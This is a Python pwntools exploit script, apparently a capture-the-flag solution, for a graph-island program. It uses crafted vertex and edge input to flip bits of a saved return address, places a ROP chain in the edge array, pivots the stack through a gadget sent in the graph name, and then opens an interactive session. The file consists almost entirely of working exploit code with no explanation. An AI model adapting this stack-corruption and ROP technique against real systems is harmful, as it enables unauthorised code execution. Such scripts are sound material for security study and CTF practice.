from pwn import *
from ropchain import rop
import sys

context.terminal = ['tmux', 'splitw', '-v']

RET_ADDR = 0x4014df
RET_GADGET = 0x4155df
STACK_PIVOT_GADGET = 0x4a7c59
VERTEX_COUNT = 8
VISITED_OFF = 0x98 + (VERTEX_COUNT * 2 + 0x1f) // 0x20 * 0x20 + ((VERTEX_COUNT + 7) // 8 + 0x1f) // 0x20 * 0x20 # offset of visited to ret addr
STACK_OFF = VISITED_OFF - 0x68 # offset of vertex stack to ret addr

#print(f"Stackframe size: {hex(VISITED_OFF)}")

BITS = []
b = bin((RET_ADDR ^ 0xFFFFFFFFFFFFFFFF) & RET_GADGET)[2:][::-1]
for i in range(len(b)):
    if b[i] == "1":
        BITS += [i]
#print(f"BITS ({len(BITS)}): {BITS}")

# conn = process("../deploy/graph")
conn = process(sys.argv[1:])
#gdb.attach(conn, "b graph_island")

def bit(off, b):
    return off * 8 + b

vertices = []
edges = []
edges += [0] * 4 # padding

for i in range(0, len(rop), 2):
    edges += [struct.unpack("H", rop[i:i+2])[0]]

# overwrite return addr
CLEAR_COUNT = VERTEX_COUNT - 2
vertices += [(len(edges), len(BITS) + CLEAR_COUNT + 1)]
for i in BITS:
    edges += [bit(VISITED_OFF + i // 8, i % 8)]

# move stack
edges += [len(vertices)]
vertices += [(len(edges) + CLEAR_COUNT, 1)]

# clear stack
for i in range(CLEAR_COUNT):
    edges += [(len(vertices))]
    vertices += [(0, 0)]

# move stack
edges += [(bit(STACK_OFF, 3))]

conn.readuntil("Graph name:")
conn.sendline(b"A" * 16 + p64(STACK_PIVOT_GADGET))
conn.readuntil("Vertex count:")
conn.sendline(str(len(vertices)))
for i in vertices:
    conn.readuntil("first edge:")
    conn.sendline(str(i[0]))
    conn.readuntil("edge count:")
    conn.sendline(str(i[1]))

print(conn.readuntil("Edge count:"))
conn.sendline(str(len(edges)))
for i in edges:
    conn.readuntil("other vertex:")
    conn.sendline(str(i))

conn.readuntil("Computing the islands...")
conn.interactive()
